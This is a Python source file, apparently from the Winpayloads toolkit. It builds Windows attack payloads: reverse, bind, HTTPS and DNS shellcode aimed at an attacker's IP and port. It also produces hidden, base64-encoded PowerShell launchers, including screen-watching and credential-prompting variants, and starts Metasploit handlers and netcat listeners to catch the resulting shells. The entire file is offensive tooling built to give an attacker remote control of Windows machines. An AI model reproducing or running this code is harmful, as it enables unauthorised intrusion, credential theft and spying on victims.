from main import *
from payloadextras import *
from startmetasploit import *
from generatepayload import *
from sockets import *

payloaddir = '/etc/winpayloads'

def checkClientUpload(payloadname, powershellExec):
    from menu import clientMenuOptions
    if len(clientMenuOptions.keys()) > 2:
        DoClientUpload(payloaddir,payloadname,powershellExec)
    else:
        print powershellExec

def reverseIpAndPort(port):
    portnum = raw_input(
        '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + port + t.normal))
    if len(portnum) is 0:
        portnum = port
    IP = FUNCTIONS().CheckInternet()
    ipaddr = raw_input(
        '\n[*] Press Enter To Get Local Ip Automatically(%s)\n[*] IP> '%(t.bold_green + IP + t.normal))
    if len(ipaddr) == 0:
        ipaddr = IP
    if not IP:
        print t.bold_red + 'Error Getting Ip Automatically' + t.normal
        ipaddr = raw_input(
            '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
    return (portnum,ipaddr)


def reversePayloadGeneration(payloadchoice,payloadname):
    portnum,ipaddr = reverseIpAndPort('4444')
    try:
        ip1, ip2, ip3, ip4 = ipaddr.split('.')
        iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
    except Exception as E:
        print E
        print t.bold_red + '[*] Error in IP Syntax'
        sys.exit(1)
    try:
        porthex = struct.pack('>h', int(portnum))
    except:
        print t.bold_red + '[*] Error in Port Syntax'
        sys.exit(1)
    shellcode = payloadchoice % (iphex, porthex)
    print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
    if payloadname == "Windows_Reverse_Shell":
        ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'nclistener')
    else:
        ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'reverse')
    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
    startRevMetasploit(portnum)
    return True




def bindPayloadGeneration(payloadchoice,payloadname):
    bindport = raw_input(
            '\n[*] Press Enter For Default Bind Port(%s)\n[*] Port> '%(t.bold_green + '4444' + t.normal))
    if len(bindport) is 0:
        bindport = 4444
    try:
        bindporthex = struct.pack('>h', int(bindport))
    except:
        print t.bold_red + '[!] Error in Port Syntax' + t.normal
        sys.exit(1)
    shellcode = payloadchoice % (bindporthex)
    bindip = raw_input(
        '\n[*] Target Bind IP Address ' + t.bold_red + '(REQUIRED FOR BIND PAYLOADS)' + t.normal +' \n[*] IP> ')
    print t.bold_green + '[*] BIND IP SET AS %s\n[*] PORT SET AS %s\n' % (bindip,bindport) + t.normal
    ez2read_shellcode, startBindMetasploit = askAndReturnModules(shellcode,'bind')
    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
    startBindMetasploit(bindport,bindip)
    return True


def httpsPayloadGeneration(payloadchoice,payloadname):
    portnum,ipaddr = reverseIpAndPort('443')
    try:
        porthex = struct.pack('<h', int(portnum))
    except:
        print t.bold_red + '[!] Error in Port Syntax' + t.normal
        sys.exit(1)

    iphex = ipaddr
    shellcode = payloadchoice % (porthex, iphex)
    print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
    ez2read_shellcode, startHttpsMetasploit = askAndReturnModules(shellcode,'https')
    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
    startHttpsMetasploit(portnum)
    return True


def dnsPayloadGeneration(payloadchoice,payloadname):
    portnum = raw_input(
        '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + '4444' + t.normal))
    if len(portnum) is 0:
        portnum = 4444
    try:
        porthex = struct.pack('>h', int(portnum))
    except:
        print t.bold_red + '[*] Error in Port Syntax'
        sys.exit(1)
    DNSaddr = raw_input(
        '\n[*] Please Enter DNS Hostname Manually\n[*] DNS> ')
    shellcode = payloadchoice % (DNSaddr,porthex)
    print t.bold_green + '[*] DNS HOSTNAME SET AS %s\n[*] PORT SET AS %s\n' % (DNSaddr, portnum) + t.normal
    ez2read_shellcode, startDnsMetasploit = askAndReturnModules(shellcode,'dns')
    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
    startHttpsMetasploit(portnum,DNSaddr)
    return True


def reversePowerShellGeneration(payloadchoice,payloadname):
    portnum,ipaddr = reverseIpAndPort('4444')

    shellcode = payloadchoice % (ipaddr,portnum,"|%{0}")
    powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
    print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
    checkClientUpload(payloadname,powershellExec)
    os.system('nc -lvp %s'%portnum)
    return True


def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
    portnum,ipaddr = reverseIpAndPort('4444')

    shellcode = payloadchoice % (ipaddr,portnum)
    powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
    print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
    checkClientUpload(payloadname,powershellExec)
    os.system('nc -lvp %s | nc -lvp 80 &'%(portnum))
    os.system('firefox 127.0.0.1')
    return True


def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
    portnum,ipaddr = reverseIpAndPort('4444')

    shellcode = payloadchoice % (ipaddr,portnum)
    powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
    print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
    checkClientUpload(payloadname,powershellExec)
    os.system('nc -lvp %s'%(portnum))
    return True
